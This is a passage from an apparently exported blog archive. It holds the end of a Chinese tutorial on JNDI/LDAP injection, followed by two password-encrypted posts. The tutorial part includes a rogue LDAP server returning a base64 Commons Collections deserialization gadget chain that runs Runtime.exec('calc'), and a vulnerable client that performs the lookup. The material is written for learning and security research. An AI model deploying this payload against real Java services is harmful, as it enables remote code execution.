class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>受攻击Client:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.el.ELProcessor;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">//   System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);</span></span><br><span class="line"><span class="comment">//            //写法一 将codebase的地址写在lookup中</span></span><br><span class="line">            <span class="comment">//context.lookup(&quot;ldap://127.0.0.1:7777/#EvilLDAP&quot;);</span></span><br><span class="line">            <span class="comment">//写法二 预先设定环境，以hashtable的形式保存在context中</span></span><br><span class="line">            <span class="comment">//System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);</span></span><br><span class="line">            Hashtable&lt;String,String&gt; env= <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">            env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;</span>);</span><br><span class="line">            env.put(Context.PROVIDER_URL, <span class="string">&quot;ldap://localhost:7777&quot;</span>);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            context.lookup(<span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="一些题外话"><a href="#一些题外话" class="headerlink" title="一些题外话"></a>一些题外话</h1><p>一些题外话：在学习JNDI与LDAP结合注入的过程中，我翻阅了大量资料，发现网上基本都是各种复刻版，实在不适合新手学习，后来去看了<strong>Alvaro Muñoz 和Oleksandr Miroshhe</strong>在<strong>Black Hat</strong>的演讲，感觉豁然开朗。在此文中，我难以将我遇到的坑全部讲清楚，建议动手操作，最好是先去看看<strong>Black Hat</strong>的视频，其中将JNDI注入、LDAP和一些相关应用场景讲的非常清楚。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.youtube.com/watch?v=Y8a5nB-vy78">A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land</a></p>
<p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf">HPE Security Fortify, Software Security Research</a></p>
<p><a href="https://blog.z3ratu1.cn/Java%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8.html">Java RMI反序列化与JNDI注入入门</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Interview Questions</title>
    <url>/2023/06/16/Java-Interview-Questions/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="81dcdc8e23abe052856c796a61b57ef22964f67ad69a084225989e18fceb54c7"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Development</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Concurrency Concepts</title>
    <url>/2023/06/15/Java%20Concurrency/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="dae767df144a7f783e6dfc1d5c66e4016c375388a086c2e9906f8c5465c3b623">cd0f823baf90a976c0e289ada245372b93026a42bd5bb577c442982cdb8eb9bf6ab972dc80b0da877a000ab20716f98a71d374bdeaea13f4a3fc44489e6a7cb6584d6010cbb1387cba37258ce123d5da72ff68ea4af5d71f81631e6428e51a2dffef6bddeb158216766183f797d0a061749d33b2220327958f92a23fc99cbdcf0dda2324b1dc4f94db387cf97b9d2ca8b3d4dc8870afd0bec4fa63920590a561beb11429829b6a72e76e51fab5044d17ad021151dac9fccf3edd57857d26ae1d5529064eb3ea401ee284b102b8dd0e84b9bf0286b030be0a069f2d155f4305f761522721a3ee9329ee21457f8e6eccbb0e6a2a6ad4726c61a2c081ec91631531cd4d84cad7e0006ebd0cedd3df239da8ef210754b82903bf8bd9d7c75af6c09c9efb702c86447d95178e37163716e34d675f5cad318f7789d6e85c6c26ab19a7cafc4c393e73a5e1b92d09d5caad7c388bcfb874ccfc78d67a0112b28c2a8b9c23c4c67ae5762e27e76c39bfa2e8ad1cd7b013e5fddb82ab80e9bcacbb0bb907e1b94ed8bb687301b4a3950ef79852cbb9e1c973e4dad356a78366feedaf80fbb54948bbb01398549a73fe79ac680bac4e15babdd72eddf25c3386deba3eaa0f5e07440d619f59d9f6195a6b0efe0613da6b990f5568629936e4699964733cab55f868694aa2ddf1f20b4430ae54c7608df43eef083fee73463a5d8a12e740fe8ae6cde11a376ae7539a4d3e439b7e2b93675bec65742650881c8a67c397929ba745b6854921fe4fe57270eb996b380517835c55ae8d19d0a14991cd121ce61a5477776e523d103bfc038a5149ac3a99f1e40907cd03883df811f9c9334920d51563b1175737d5406bb9b089834d9cd5d97816116014d2d4041e95998d0224445fcbaa1da993f41d43cb4137ee94afd521a1aac913df2f13de31dee033708ddc0e24afc9fd7cd4d21207733897f296b00b3f478c50a1dacf2a02c76a1a709cae005c2fe52ba424a670a2cc17b1c1e0bf33005628b8bb50261cd6b64e3ba16b1ff602feb4c11c512d6a2e265f184187662363968eb5ad27c34030953ca228ad7f76878abab03ad7d483a2e9ef11208e7928687cba25f37442d880ffc617ff084f2b4ea1bb9ebe9da5a41b8129d0bfeae1dd4a195408c0bd6a15331e1b75dbeac47bca5b9d197d49faf78af165fa7732dfae283eaa35af285664efde12f7a509d19e8af0977fcf9f1c7fe168feafc449c96f35c9aacaf6d8f1be23d473253309a0802075de311e81895ab3d72e904ce15916164cbed71fc28ac50c2a43fb3f1b822179728c3a738273ab95ea632d31b400dbdea8ce0eec50ab6f04e530a6de27cfccdfdffbc6931debceb58898497212c1d59918b99c0485dd83bf1dafddf777846083807279039b42e5c55c80d3c10c3b9673bc9fe6aaf60227b6db272c8b968b2d98682a83a996e8104f3bfa12bb2783224e31e5f05abd5aef89f022bb0d10baf8b657d3ba78fc1c3364a327a750ebee71c399a96e691017a9ea053edd6994641db86583d152ff6d20045135184911df441b64fb353c5582c7a6dbd3f55aa3842457597260f7b902f8264834c63acc82bec7934ad4a4abbb28ff5e09655feca4101c20c741771cddcdc96c99273e16352ddd48a94a8eb4996696bda4b92159af16da75a34292c076cecb680f1b18ad793c99896e469c21a2c20922f23d1d7f84d1417d2022ec47672c9a23b69b69467c7dcd11775161a1179fb6074cc983d2c803f29716e47f378de48fd52d9cf650223f54de493cc4134b35241603d7adb8a8b2d10a4b9e989854ee0a70bfb94ea60b696e23b4d2f805b90a379bf108941fd33b6a068f4453d6338a6b4adcd1c1695dfd4c357d5a848d2f2d9b3b83877d255c469300f17143889d9f19d198c328436adbd42b9a8912734a1b59ab979824ae482626c4a01af4dc9ce7fc51de5d4a1a0030f37a92ceba814338150b7ca6fdc7a87ad270d20fa56aa04cab5b6cec72cc09436ac9c5e3536dd334ed33eeee14325ae533c2c1c03567d487cf5eac343b1efff3145906ceca63b2160bfde5ac32710435627722a606af7817dfaf4a00806ced82d212c52ba3a1601f045edf09bde43da44e283ca68cbb36bc682921ba50e21437b3e85186fcb5b1e0fec4054cef65d2f06ee46082c923a335e569b84706800b06dec788b30bbf18726ba587c5c19c33abf14a4b25a1cb67a46ceac50c1d78b1f7f6a236b10e047dc21f12146afdf0a35f9e6f158754f662302406728cf91e393357c16f0b50a9d05e619739cfe68167b0e2265718edbf18734097af6a877e160114f3dd47677c332c344c5ba849d6b59d239cb49e2ff4e8e5e5d1f490dfa573983956ac04750f7a1c2d35c51325d4be0d77347f3b3dadabab86cf602b6091b151c41a6eb0b08119ffe48b52c131b584d743d6d22ac02e4b50dd86e7c5eef222577ffbed51d094a2e9604f3d6a59e6c8703b5c5b1e4479402c277e7f7d844254e45867d90267244b4c950bda840750f86cba149c2eca9f9ece4ba6e1fec279b690c6f52db63498ac2cb66368625500a5fea4bf87ecdfeb4a224983ecfcfed6730e9dbcd499ecd9366031cea53ccf6daa162487a0040c27cfb1d77f2995564ca8faa18c69fa5cc3c4bebed454e30861d3867549b6199fdbd58ab63368441b902cd21d7fe783240bc00f726b97b558a7bea5eb6ace9b6061cc8dbf7f69195f4134b896c1174504273db56f1cadacb39074158b9ec87807152ad796c9644643abb61b7cd9ef5f6fc22869f0ee8b262fca3a0213ffc21f67580c865881f3a368045a8cae2b620b42bdaf11c8196011d520fe491297db89dd498d38fb2139d04d8b58c61ed0f3f5993668716c6da9922f34716a7a162125b5d1c746fdee97d490c4c07a33703fa2fad10594cfb11a560fa293c453a8a12d7e8879cc2b64a3e054811f76391a42c008e0aa81a93713a69cbe8b8eccebdd84877314a83f017c1f83a41503a0f87a30dfe399379374ff222a74f2f40427492d63e1c11a4c75984e7d34de904b80d75a6862814b86cbddbc1bd7c2baad5d54d30f10a2953a2c60839abb510b15d11c67ed8ead192c6f189c283de99f2e355b323bff20ab936cde195ace10eb67e3cbf99a19ff1cadca7bf5e388e5bc200a3f0e7ea8c6a208f5317cf358d50d1bb834fd48b40de7cad12277a7b6b57db6252ad89aecfd3cc138154bbf6a608e3c53a4ff81617212742a68b1b67d9e2e0a6617bb8801e571d6159faf702b03b4f8c432959663b498f7958a24162a57000c276a731c80a201f191f4f84ff5b91fbf9bddcc0747f5c4788a79baf6dbab070c5a2777441ce4ad40c9e879ed1a9f794b89ec8c4658ebaa725bd0491716161150a6d6fbd2e1f17468f93657661a1bfe13db3e387b96d744f2679d998610304295356e31c4c559aa40b1684d379667c4133e249f92bedd35bbab08ade2b4f664264d798b2fb738278a82ff95f521f31a4bbd0d86fa131ec411351475e3b6e404b41c0ccf87f79ff1edf82220ede523250953b8c8e57ccf3a21c25d89a816f35efe1567a2ce473991d87cba8e20dba8c30d64f4551ca1b98fabf06bcd52761a01868c0fb23603df6af880e4131147da7b23cf30299535ac60eb7297d5b7200f1040e585a482e5b115a564c9d81526771c65127847183acf8f020ac275472da1f46d8afaa6dbc6be88ec9574873289b5f4e18eec2e40224975a0a1f2216206409804e142293922f5f9435fff8251437b060c220781980b230d552f1d6ac85afa679289932b59bedfb499598bea63f851c92124e700b94e1067a15234f5ebeff1eebcf1e97e645fdccb50bac4fbee791bc389e4b45f8417150c6cb79b9bde60ec6b6ee7fe04bd9804bb5d6f5c8de9edb37917ec461667c32140744a33ecaa3cb87d917b859ca19c6ae73973ebcb09c750818851410e59a9dabaf83595d348ea82bd6d3e13759bcd62a105ae64f665bc6749fb2aba93e474772c07e9dfb9b913ef3dd176e033f61bb42e213d841fa2feb37094df93ee696111c78b6574e62212797df4fb69b280578f972f13d5bbcb72c13b7f2b753dc0675df66384f64d4f6020eddb2141d1b938f04d905f4977994796520ef872c0c0f1dbb5f919589d2e3e9ed9b98756bd24be77d69f3f87ddee2cd2c2106165154388cfb9628b113066de9a944ca91dbd1d82593ad39e2360279d41cac95c77fd21dc555d0b97e86b3b70e112b11bbaac7f53b24169f13da164ef803c6d1ec8e36b9768f936cb99ea05ccdda9debeab951fc22785b139dc730d5bfd0abc1d2c03391762cd8c69a8d1607258898da94f33235f1b316d9544eda52ce21d37c00da4fa454c66f9b2bf68fae358594299d2fe506262860a7dfa3911f08b85f952adf4f2cff218bc27f4412a56c01eb838b5f444ec7bbd145c77f0bcb20278b51425c823b002dc790bd18bdec8c0050c804a5ac6aa363fb046f944b8676ae7ec929cd83817d389daaa76104e9a880f00f8bab271d376ce96006b5a965b42fd534a9e44c73ad4018293b7c67c8cb7c9a5a111c68d5d03f99f841687f2a14eb694c70791ca73b7dc9efa8c9d58733cb4aca8ad1e121b5aa3cda7c3b96bd281a4e897b7320514906f070f3e58c88b81dea2ca81164f1117507dba11ef03d803bc367a5d1d9b8960d3050da57499270707c9479dc4a175537de59d35da61185f6c6acd13aa64240064048d728bad1a0849f312a3d07b924d4bf74a8ac9bb68f8243eb36b36eb0ccc4f59d56b60f3a5f61e0c7e28b43e1a6cd63b3312ae65bf458c975bba7f7264a2ac7c6cfb0058b1324fc466eb9e13bfc3db7222c9d69d372e3bde2c6610ee8d4bf80764005ab7b9bb341d25342926d079169c7b1a7b6dc7478b51069481a9d47e8a315460ac0ea2bc697bbdf151a9f0a69b060975331acc95e299ce459086c16d781f48e92916917a5c20b272e0acf354af019bc3edbe2ede094c0db39a0d3d917431900761ec2ca1a0889f54f70e6bed10788fd3caa30d37d1a0d0715306d15197df9201c9c9949775a717cb1294b0c654d9cf08557315190ecd7a94784d47df5aeb1c44cbf819cab5c74110a85536f2af000b5203678d5d2f62f8f66ba3968fd8dca332b2c33436d71164d665432643317156931438a52a2466e3ab8448352a5ed805a8634954f739affecf0600c0478ea003db62aeb38b0e1e8b7262fcd794ccba9b74e9a991f8b0f1861cbbac9226aea9e4bad53eadcdd31ac308eb67912d0ec78babe65baf7e7438764e9aec347fe394a96f6e08e3e00d267dbacc612820ba305fd14d64f129735205739fed5f5bdcd22d55d69099373163e52aca0df8fab0b812bc4a898aa823e3484cf6f1017f4e95035b7ac9f5760b07438acb2943261c854ded6fc4f9c5aa55acc9c3af1cd148829deecb7f68231dcd17613660a542c9b518c1f828c66d96a78de674d8163378978699f013f88df8c1aa5d2c7e64bbb8f9f3f1628131b39cea015722e97107f7dc5aeaa18ff782849d448367b833b6af363201bceb4b45998c87a8e79756a4f64934c65fee75724eb37907f8da77dda364d0b9557ceac8ffb547714fbdb5e37a4680c651c5ac7e84e34d53a9489147ecbda0e347d5bcaa01946eefc09da97001a60358ac1daecc598c3bb1129156478a2e652a4be9d622473a466f22582630b171807fc3ca7d3ec96a008e031dfe21be6ace82f6adcab4a40b56b16d0f80a4b6cfab2422e3908ead7ceeba6203586408c9fbdf497c3e7c2a3d513be115b957c2ac040a92289efc80f47e8a65d55125ce016a9a4feffe99fa1597cb89acb855cbb422bec8e6f89efa04786cb3aa50590237e75ef4069feedcf7f82842e238fdafbb3ccdb7018b452aec295e3271f435fd8f5c5345e6e5b5e83d79cc59a387fb74a1d5a2bf46e799125c60f8dd8bf24992be608157f5f56e46b7457f620d8028374f208687462b9efc8d5bac4e095e5f13ecaae22122c35ea41e4029539851e40a36edea7046d3166782842320ddbc5facee4adb527a6715ba9177fa5b35e644c21609573ab45b2206e99bd71c84cb6b3d395de1d102eb62622acf1676dc2252e101872fb807d821b01e44cba9c116d2e6df9ab8f93826b95335c1c02d299b06abf4b281b8aea42e491af007f43b4ffe7df605a547ec7f8ad4c0ba24bc407a38f21ce52aaa11e21fa1bc86afd765f459f96e86953f8dcf7bf043fbc0406f828dfe9f0ecb1a37a9cac6eea649cd4cd8b6dedbb8fa0fbf58083e2c03e5e15bd1be8ed60d3e4afddd9d25235bd263823cb2b3dea755b29baedc1253293cce51c8453c38bc1d9f81bafb5d1c2ff9cc89c1a75428f4c44f1295cb5c23051eec999a25c18fa7b0eb23c84f9ac2aa14459e5e8d43a991441c45a5213c4857e2bdfb9760d0e6a38f3ebdd303e73ea25a138d0e87bacee8552f4cd3e50990637d2162bd2b4de9cb79a506542f8b6edf76248974e9f5e92768d4b738d27b0c3c89a8e1076ac06686425ec133d39095060cd3c445cf30d7b2774184ab75866f46f39405dff9a3e761c93c8b873dc9c69221e979cba662ef3afd17f89a344e4ae9a95b3fa2e59116c0484bb87c1578430605388e234eb74ca99d46b2b1dd77f0f9032bdad10d20bd546a47ef4c76089f2576376badeab053b15539b85cb0f5a9982fd7af3a6358b1b501f596ab00ca58007e7b3bf2c7975a5a0a7fb6b06cfd89fa8d78938deca628c00299d2b63a77c2c4f97491058c075ec03897c79b1041f497aa0f4281f82618141b1a2954860e16afd81f31c24b989e6a3c6a1288331e5eaf06bf093fc36fa7ddab54846ed00b8ed75e7d84d418e4a225bd4a5da4c8de21ebfcc428cbb221160b2e0fc18a6c69194d64b2da769e749a0576dc5cd084982b0ddb7957ad4796073b8323a5ae5c6b65e4115d9d198e3316f7b4b01fb4b437c752a728981a31621ebddb21f0e76696e7d1b59ee932c6786b18c5a9976582d7ce60d17e6546cc467d7282083d2f7a568cb00404ccb281e61b27e28fd1b8086322bc32935baa057aefe8daf3cd2b4d68e8a30b4882e2622eb7459f3ed25dda6a763436c067c664d8719d528c0dde4140e2847ffb508300d335ffc11882b1db3b3162bac49d44dbe9551e08f932725f47c42d2fb6296d4d330d4b3f4260cbb63f0e46654a7a628bec1dc01b63aa92997e0105ea9814e06013ab2831480b40244923d42d8edb4fa4cdf7ab743b0c9825232d58990479596070f9a8b0ad35496aef50371aa2f25e7c31d457806181e5c9df2a93dc67e60d7918edb737be822f05b38240aee3e49c3cfb84540b01ba6d4b6c3e04020b28b83dc24816f43bd0c8072fc157b37ba5db0fbb91a349b8e0f05cb3c383eb93dfe4c1a13edb46a33c94f8d2fd295bb70dffa50469c98b33cee5a06d43b619d2fdddc571beca43d500678235a650e534bdf4edcb094211a0decacb55bd35b004d6d91a63eac9188d71f4770f98fa2c4feb55a218bd3872905306aef754ed888028bc70e7428dae0c142878e5975a0cecc2587187fd13f98d5ee823d5447b00bae52e07f5a1faf1ebe0b1a1c3402d8d7165bdcb8c7d04a4cd2e11eafcc8597636b034eb240714c0e98a8c2bb151b071b386dcdffff567e88073878028b74f23c7ab06b7df67196ae8c4377937b3285dd0dece93bf9c50e7cd513e5f20c2b3846f3a88b45cefb4840e3a4a45bcd4377affccdacb56b04cb71c9494e22babef8186080509a90ddc27daef0a47b951b4e9ddb0c1c70c93918a7d5e78fbf1b1613715c395261bc6e89807ea70b1787810441ee6e2ac8367bc8ca00901e2cc937c69fd452ed24a83635b0dfec3f798b55a31c667f3c45e8284bb23902f682dd31a77fba8e0c757d3551b89455ec0c974dbd73b16bd610fafa95f2999843ef02e6cc1f58b0f272af2ccd20908e439de537ec2578a7ea12c608ffadada1c468357046811a64d189479053e60f349e6250bcc42abd06810f45109c79d6697358443d75ba9017e2ea4d6255674e66288ba72b79b6e95c948a0b46ae579246a84afdc50603513a09e135630e0304a73d5c259a201e5d77a7e9765c09fd9c1b89d445442a281788b0930d2d881a4e4032fc1fdf2593cd5deb314d6501a8b89d47205cae18d4131f0ddbb477dd515700b8fd6d467d750e02f3f0f55e4c9f3019458ba205106bc5373ae70b6674da4cb10c67b8cf400601065b7323f7fa580f894650189ae2c6374ee08ec311c45b5164e6cb1fa860a6ea82c5ee49c95ffd1865ef8d7bf980db2bbb8359d162b648ac8758a04ee1060c44873d1927f73aa9b958289a8a1a8a6eee79d38277805686bd5fd3d457aed1a124ddbef3d3476f38ee1ad737e8031ea29f0f5cb3ad86190dfc924da639c30a79d40d20ced550357035b48aa8604cb02f10a7aa2c4cba29bd8d48514cebcbb97f7923c5bb79e5c76d91d42067717f7ca985f9097dd9129e40d8502758929dd95eae822cad0df7ae88fafa36b941134ed891fb4b88c56b8bb8a50cdf6eef66553f2eeff1b980592de7b27b89a2ec8a8a99677ed7f196a0b2da3458b0152749ecffd613b0b32e158e486d508795992d6063641ac6a512cebee181921c29cf51f6253f321755333b65600b8ed8befdfb12870e199e13fa02b989c6a59f51e0370cc4aee2bcf13afc0b2809bede103de9647dd51001a220e95f07df77e1491a73a6b2fe359b27ef467d121b7ea94644c6f08f9f015cc7ed7bc0ff271ca489f5205cb5b7c44112911e2652e06f1d85a70b782dd03f32a950bfad94bf148ac2ad14ab4cd85e273a79d685f93b0093a75b15af03821fb31ecbe2620403f4b48f6d24da24062dc21ab0241276dd1f3e31b2e28c652c3c0968c570470f28c97993d0d4a9bcb8a411e5d11216bdae55753cb48b8da24e7502d776b7f59819a2d5b9a9aa4064054556e704368fe06c091eefa3a474f8e7643e2aff003b476ade464e1feaa77261ca34fa63f6213f2110bab02eddc28f43fa05e6e7d8392bbbb8954cecb303a000255e748c94d515ee4c40d859710302a1e3489d7b02b38d5e1a2be0e62bc78b2dcc59698cb922a7fdf038f66c7f971c4b75bf35561f2fae32233d0f47b4c898234738a11554072b5878a9e89e762bd3d0f01350afa23068a931a80f3b4878d7967d159889ab28e66fd6ccbe92afa174d43715900fa36a0898515e45d95dd142144c31072e4e2beea324ee067427866dcfc6c61ec71c30a1437800df99a89fdd359dc019740766c4d111ef36d8b24b84ee71c8fdeccad0515cb88701f6edab5203bfbc35c33f2d03089cbf916b639bfb4274b6ea939bf2d1b3fabde2928751317d62cab1d996f1b4bc2f662516135b9dac54c838545993500edb168a161be00083391c095d39501bba32e0b0513e63f081fae4d8abb5265f309831fb1fc6e510356727d5f5027900c31ab985d36393e7806d2875375ce260daa963b00ed49489e4d21e4db5101079805edfca5d1bb4f8ce906d62abface97a5e160d8aa646768da8e968d99cf61643574030e446573877066058f5c0fa8b872a6a6fc86056122d1a62f9f1112366be31be4c7b6849608797313d4514c06a3814db4788fcff5173922921b480c5feaec05f7ca297cb11b24e092a8e3e510cbae6337fa3a15b645daed08d6543e1348c0d64e02dec0b256a44e7d24270914e5f2ac924c10f80b99bf86cb90c679b57e6f272c48e0fa578bc7f55f5dc4b7306082cdddccfbf8102effef8a7e5ccbc73697fbb36df3bfdd5eb4f98e44c80e2583b81164af611626595bb4090487432f7e4fccc013e0c070b75709f2a056299c9fb630cd1dc1fd785fdfeedf828a3d9aab1cb0102dca5cdde8fd32877a73e361781b5869a1b25dd9939f449dcad9829bad1c8c78ca7fb8a352318d9d9d8dc7081dc5f01d99dd92934ebe68c9f2a1d6247b682bfcad2404a67b37afec94dd20669182c4702b3407efaed64ce414701e5ad13d1a08ed12510448a3ad56da1c024557f34a0def362f945a7b99007ec0b7ae407e09038cdf2b449cf24f69e9d45c97d9a079c1210bb20291cee705b297e3c4a2df17c5552f5bda2b7279a821a4993a062dd56e182fcfb17a73cec5d0f7608c801ed9a72f5dcad4c282e9404c382b3862d80c898f38008683860470091a3291513fad61236045316ea8607ca88ee54426190cf29a38c39c287797d92d06da133f21a1df0df40c941d48ecf05eb8a656e3d004906c49bfe145638815180ebaa596cced8da6f00a7fef9b77fbfdbb9742d69fa7ab95ce557a0cf8c8ed4ecc79a4e1d82b2c673048881bfe35586294f873fa295efbea6a53b04a1a264bae19a7c6116fd2ec1f9ec97d60b740847d30cdc1ceb02348b41a608553cf4b4865ad020927e159b43a20c6584220651492f8ace839ab16933c59bab356a3b4e6fbb28230fa4db194983e24392cbc8601d73fee326cd5e101e55320c3b12caed813991b17828b3d726ebf3f76584d889fb2a94ac168142a700c617dd66dd81a90cc82d3f2a24b1ed82fa7ef5e371216f46eb50a22006a443806aee02c654017ddeaf7f61fc5702776fe768e686d421e0bcb24a4981a46f3befd66ad7107d7c6b5da937e854d1ef0a655f118e7348a68aa5f215f73dce600aa3c926042adf294fa1f0b81239f405c4f6a0b79760c3b3cdebeb68ca6039c9d718699745a8277cbda07808cc370c356b6e503386cccab25707f56f937b52f947f5a041e39708758330501cf8956d4133a600ea659282ef6ddd12a26f8df01b045e262e5596775dc23342527efab863bb836e17061be52a72cdb18c386a67697f44f3dd604e9868134f12830f526207e91e2dee41a59121db4e9df6cf6bfb3372a9e89f1bfb4dce78ed5aab70b58843f199e202bcee27170eb6e85a4423ee590fd2c7ae2ae0dd15c2326bb550bb04ae5a6ab660457cbf76de938ef200afe1c7596081c5b6cd79240177f1c392f155aec26d78e66a5adf807b26d8ff2ab69cd1b9401308efaa17db7428f9e41b9353ffb6686f3dda59f2559efbd9ef97899de28b273443062f7b1a1899ecbc01412e7d33793272a6760aaf392d7519babb73c727f9cfe1362e7217f770f6279f14c970b005658dd579368f100e4368fddb591745f9e60dcdf4e151e950dc47eb60f844c68dab9a9a1cae7f6aaa226d994a6a70746bf3bc1730958801853dd9dfafd9891940a22ac073ae9a1e411d5eabae7b655dbc68d530c5cfefacace093cb094db4b8123c49550e0b95674c8afab2218d3c38b0c933e224b049b8ccd4f29a1456f15f83d9c0cef0a532b347527cc2bf6f04418a4fa7a3e53af4b6ad9dfd3ed04404d65ad3cd3c7deb88a7ea063b84562d2e6d1560a57708a7d7684f5a7a0e04e2241eb35c13bb6ec3e8388ebe2d25e61280b5d39be1f5c6650fa25c8ad35a85b6541d6abb0eb8925148882bb22441f5c03be68ec71c2f71eb07b8ba951d0f826afd8778af0164c0869e2a33825f6667fa83859fefcac22f8c3e8f5c77f74ac9d9fb1b116f01777b0471a23a928ecd31dfb53c47095a3fbb4b5d6ad1ccc15cae874608f34606cccea71e5083fc4d66df36a12a88cd96bd8eeec982a3c17225e7787c33b8095b84c5cd7aa0374353a